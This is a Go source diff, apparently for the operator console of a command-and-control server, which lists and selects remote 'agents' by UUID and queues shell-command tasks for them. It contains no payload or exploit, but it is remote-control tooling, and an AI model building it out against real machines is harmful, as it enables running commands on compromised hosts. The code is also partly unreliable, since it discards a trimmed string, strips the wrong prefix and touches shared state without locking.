@@ -9,41 +9,52 @@ import (
 	"sync"
 )
 
-type Task struct {
-	Agent   string
-	Command string
-}
-
 var mu sync.Mutex
-var task Task
 
 func GetCommands() {
 	for {
 		reader := bufio.NewReader(os.Stdin)
-		command, _ := reader.ReadString('\n')
+		input, _ := reader.ReadString('\n')
+		strings.TrimSpace(input)
 		mu.Lock()
-		task.Command = strings.TrimSpace(command)
+		isShellCommand := true
+		for _, command := range commands {
+			if strings.Contains(input, command) {
+				go RunCommand(input)
+				isShellCommand = false
+				break
+			}
+		}
+		if isShellCommand {
+			state.Tasks = append(state.Tasks, Task{Command: input})
+		}
 		mu.Unlock()
 	}
 }
 
-func RunCommands() {
-	for {
-		mu.Lock()
-		if strings.Contains(task.Command, "AGENT") {
-			state.selectedAgent = strings.TrimPrefix(task.Command, "AGENT ")
-			slog.Info("Selected agent with UUID: " + state.selectedAgent)
-			task.Command = ""
-		} else if strings.Contains(task.Command, "LIST") {
-			if len(state.registeredAgents) == 0 {
-				slog.Info("No agents registered")
-			} else {
-				for i := range len(state.registeredAgents) {
-					slog.Info("Agent " + strconv.Itoa(i) + ": " + state.registeredAgents[i])
-				}
+var commands = []string{"SELECT", "AGENTS", "TASKS"}
+
+func RunCommand(command string) {
+	if strings.Contains(command, "SELECT") {
+		state.SelectedAgent = strings.TrimPrefix(command, "AGENT ")
+		slog.Info("Selected agent with UUID: " + state.SelectedAgent)
+	} else if strings.Contains(command, "AGENTS") {
+		if len(state.RegisteredAgents) == 0 {
+			slog.Info("No agents Registered")
+		} else {
+			for i := range len(state.RegisteredAgents) {
+				slog.Info("Agent " + strconv.Itoa(i) + ": " + state.RegisteredAgents[i])
 			}
-			task.Command = ""
 		}
-		mu.Unlock()
+	} else if strings.Contains(command, "TASKS") {
+		if len(state.Tasks) == 0 {
+			slog.Info("No tasks in queue")
+		} else {
+			for i, task := range state.Tasks {
+				slog.Info("Task " + strconv.Itoa(i) + ": " + " Command: " + task.Command)
+			}
+		}
+	} else {
+		return
 	}
 }
